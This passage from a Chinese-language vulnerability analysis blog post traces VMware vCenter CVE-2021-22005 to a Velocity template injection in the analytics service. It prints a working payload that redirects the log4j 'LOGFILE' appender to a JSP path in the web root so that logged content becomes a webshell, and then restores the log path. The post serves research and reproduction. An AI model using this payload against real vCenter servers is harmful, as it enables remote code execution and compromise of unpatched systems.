class="hljs-identifier">Iterators</span>.</span></span>concat(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterables</span>.</span></span>iterators(inputs));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>调用完内层的transformedIterator1后开始调用transformedIterator2.transform()</p>
<p><code>transformedIterator2.transform()-&gt;from.iterator()-&gt;f4.iterator()</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/55.png" srcset="/img/loading.gif" lazyload></p>
<p>调用到上面定义的iterator()，返回<code>responseMappingIterable.iterator()</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/56.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/57.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="3-2-2-4-第四部分：访问迭代器"><a href="#3-2-2-4-第四部分：访问迭代器" class="headerlink" title="3.2.2.4 第四部分：访问迭代器"></a>3.2.2.4 第四部分：访问迭代器</h5><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/58.png" srcset="/img/loading.gif" lazyload></p>
<p>com.vmware.cis.data.internal.provider.ProviderRepository#getProviderForModel  判断<code>&lt;targetType&gt;</code>标签内容必须存在于_providerByModel中,原始exp采用的是“ServiceInstance”</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/59.png" srcset="/img/loading.gif" lazyload></p>
<p>接着调用<code>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector.ResultIteratorFactory#getIterator</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/60.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/61.png" srcset="/img/loading.gif" lazyload></p>
<p>开始调用传入标签的map()</p>
<p>com.vmware.ph.phservice.collector.internal.cdf.mapping.IndependentResultsMapping#map</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/62.png" srcset="/img/loading.gif" lazyload></p>
<p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResultSetToCdfPayloadMapping#map</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/63.png" srcset="/img/loading.gif" lazyload></p>
<p>com.vmware.ph.phservice.collector.internal.cdf.mapping.SafeMappingWrapper#map</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/64.png" srcset="/img/loading.gif" lazyload></p>
<p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/65.png" srcset="/img/loading.gif" lazyload></p>
<p>作者找到了com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map()中存在Velocity模板注入</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/66.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/67.png" srcset="/img/loading.gif" lazyload></p>
<p>接着我们使用代码生成<cdfMapping>标签的内容：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args)throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-built_in">new</span> Test().testMarshalIndependMapping();<br>    &#125;<br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> testMarshalIndependMapping() throws <span class="hljs-keyword">Exception</span> &#123;<br>        ResourceItemToJsonLdMapping resourceItemToJsonLdMapping = <span class="hljs-built_in">new</span> ResourceItemToJsonLdMapping(&quot;a&quot;, &quot;b&quot;);<br>        List&lt;MappingBuilder&lt;NamedPropertiesResourceItem, ? extends CdfAble&gt;&gt; itemMappings = <span class="hljs-built_in">new</span> ArrayList();<br>        itemMappings.<span class="hljs-keyword">add</span>(resourceItemToJsonLdMapping);<br>        ResultSetToCdfPayloadMapping resultSetToCdfPayloadMapping = <span class="hljs-built_in">new</span> ResultSetToCdfPayloadMapping(itemMappings, <span class="hljs-built_in">new</span> VelocityResourceMapping());<br>        Map&lt;String, Mappings.<span class="hljs-keyword">Wrapper</span>&lt;ResultSetToCdfPayloadMapping&gt;&gt; resultSetMappings = <span class="hljs-built_in">new</span> HashMap();<br>        <span class="hljs-keyword">Wrapper</span> <span class="hljs-keyword">wrapper</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Wrapper</span>(resultSetToCdfPayloadMapping);<br>        resultSetMappings.put(&quot;keykey&quot;,<span class="hljs-keyword">wrapper</span>);<br>        IndependentResultsMapping independentResultsMapping = <span class="hljs-built_in">new</span> IndependentResultsMapping(resultSetMappings);<br>        marshal(independentResultsMapping);<br>    &#125;<br><br>    private <span class="hljs-type">void</span> marshal(<span class="hljs-keyword">Object</span> o) throws <span class="hljs-keyword">Exception</span> &#123;<br>        JAXBContext jaxbContext = JAXBContext.newInstance(ResourceItemToJsonLdMapping.<span class="hljs-keyword">class</span>,IndependentResultsMapping.<span class="hljs-keyword">class</span>, ResultSetToCdfPayloadMapping.<span class="hljs-keyword">class</span>);<br>        Marshaller marshaller = jaxbContext.createMarshaller();<br>        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, <span class="hljs-keyword">true</span>);<br>        marshaller.marshal(o, <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/68.png" srcset="/img/loading.gif" lazyload></p>
<p>接着我们就可以到达触发模板注入的地方了</p>
<h3 id="3-3-Velocity模板注入"><a href="#3-3-Velocity模板注入" class="headerlink" title="3.3 Velocity模板注入"></a>3.3 Velocity模板注入</h3><blockquote>
<p>这部分内容是当时复现1day时的一些截图，所以只关注<mappingCode>标签内容即可</p>
</blockquote>
<p>调用链：</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/69.png" srcset="/img/loading.gif" lazyload></p>
<p>当传递aaa 字符串时，断到<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map</code><br><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/70.png" srcset="/img/loading.gif" lazyload>  </p>
<p>在<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.velocity.VelocityHelper#static()</code>装载了context变量的值：</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/71.png" srcset="/img/loading.gif" lazyload></p>
<p>经过调试发现这里的velocity  context并不包含常见的$request、$session变量，可用变量共26个，其中大部分是string信息，最初看到testbnull师傅截图，是通过修改这个”GLOBAL-logger”下属性值_fileName达到写文件目的。开始分析下</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/72.png" srcset="/img/loading.gif" lazyload>  </p>
<p>然后开始调试：</p>
<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">velocityEngine.evaluate(substitutor, dummySw, logTag, &quot;<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>.<span class="hljs-variable">aai</span>)</span></span>##&quot;);<br></code></pre></td></tr></table></figure>

<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/73.png" srcset="/img/loading.gif" lazyload>  </p>
<p>发现直接通过.拿不到aai这个变量，查看parent对应类<code>org.apache.log4j.spi.RootLogger</code>及其父类<code>org.apache.log4j.Logger</code>不存在该变量，在其爷爷类<code>org.apache.log4j.Category</code>找见了aai变量</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/74.png" srcset="/img/loading.gif" lazyload>  </p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/75.png" srcset="/img/loading.gif" lazyload>  </p>
<p>既然直接通过属性拿不到、也不能调用superClass等方法。在<code>org.apache.log4j.Category</code>类搜索aai的调用，发现<code>getAppender()</code>方法可以通过其属性<code>_delegate.name</code>直接拿到<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender</code>对象,都省下用aai去寻找属性了</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/76.png" srcset="/img/loading.gif" lazyload>  </p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/77.png" srcset="/img/loading.gif" lazyload>  </p>
<p>而这里的<code>_delegate.name</code>为<code>LOGFILE</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/78.png" srcset="/img/loading.gif" lazyload>  </p>
<p>现在已经拿到NonAppendingRollingFileAppender对象,再调用属性<code>_fileName</code>的<code>setter</code>方法即可修改</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/79.png" srcset="/img/loading.gif" lazyload>  </p>
<p>构造语句测试：</p>
<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs leaf"><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>)</span></span>##<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">narfazj</span> = $<span class="hljs-variable">log</span>.<span class="hljs-variable">getAppender</span>(\<span class="hljs-string">&quot;LOGFILE\&quot;</span>)</span></span>)##<br>$narfazj.setFile(\&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp\&quot;)<br></code></pre></td></tr></table></figure>

<p>调试无问题：</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/80.png" srcset="/img/loading.gif" lazyload>  </p>
<p>burp测试时发现变量已修改，但是文件并未生成</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/81.png" srcset="/img/loading.gif" lazyload>  </p>
<p>直接使用logger.info()等方法时却还是写入默认文件</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#set($log = $GLOBAL-logger.logger.parent)##</span><br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">debug</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.warn(<span class="hljs-string">&quot;logbytest&quot;</span>)  <br></code></pre></td></tr></table></figure>


<p>再次测试发现<code>_fileName</code>修改成功，但是并未创建jsp文件且日志还是写到了原来文件中</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/82.png" srcset="/img/loading.gif" lazyload>  </p>
<p>说明日志写入时并不是取的<code>_fileName</code>,后面注意到：<code>_delegate.fileName</code>变量的值也是默认<code>/var/log/vmware/analytics/analytics.log</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/83.png" srcset="/img/loading.gif" lazyload>  </p>
<p>找到<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender#activateOptions()</code>会将<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender#_fileName</code>的值同步给<code>_delegate.fileName</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/84.png" srcset="/img/loading.gif" lazyload>  </p>
<p>再次尝试下：</p>
<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs leaf"><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>)</span></span>##<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">narfazj</span> = $<span class="hljs-variable">log</span>.<span class="hljs-variable">getAppender</span>(<span class="hljs-string">&quot;LOGFILE&quot;</span>)</span></span>)##<br>$narfazj.setFile(&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp&quot;)<br>$narfazj.activateOptions()<br></code></pre></td></tr></table></figure>

<p>发现可以写入了！</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/85.png" srcset="/img/loading.gif" lazyload>  </p>
<p>注意写完shell之后需要再恢复下fileName变量值日志<code>/var/log/vmware/analytics/analytics.log</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span>(<span class="hljs-variable">$log</span> = <span class="hljs-variable">$GLOBAL</span>-logger.logger.parent)<span class="hljs-comment">##</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span>(<span class="hljs-variable">$narfazj</span> = <span class="hljs-variable">$log</span>.getAppender(<span class="hljs-string">&quot;LOGFILE&quot;</span>))<span class="hljs-comment">##</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.setFile(<span class="hljs-string">&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.activateOptions()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">log.info(\&quot;&lt;%=123%&gt;\&quot;)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.setFile(<span class="hljs-string">&quot;/var/log/vmware/analytics/analytics.log&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.activateOptions()</span><br></code></pre></td></tr></table></figure>

<p>文章log日志调试部分图片是在分析1day时截的，所以图中的POC与上文分析不完全一致。在测试poc过程当中，断点断到了系统发的请求数据，根据这个也能很快定位到最终的resourceItemToJsonLdMapping对象进行模板注入</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/86.png" srcset="/img/loading.gif" lazyload></p>
<p>至此完成了Vmware-Vcenter漏洞CVE-2021-22005 的追踪复现，希望对你有帮助！</p>
<h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a target="_blank" rel="noopener" href="https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee">https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee</a></p>
<p><a target="_blank" rel="noopener" href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">https://www.vmware.com/security/advisories/VMSA-2021-0020.html</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Vmware-Vcenter/">#Vmware-Vcenter</a>
      
        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">#漏洞分析</a>
      
        <a href="/tags/CVE-2021-22005/">#CVE-2021-22005</a>
      
        <a href="/tags/CVE/">#CVE</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Vmware-Vcenter漏洞追踪之CVE-2021-22005</div>
      <div>https://pwnull.github.io/2022/Research-Vmware-Vcenter&#39;s-vulnerability-CVE-2021-22005/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>pwnull</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年12月19日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/" title="论RMI的攻防演进史">
                        <span class="hidden-mobile">论RMI的攻防演进史</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
      @pwnull
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
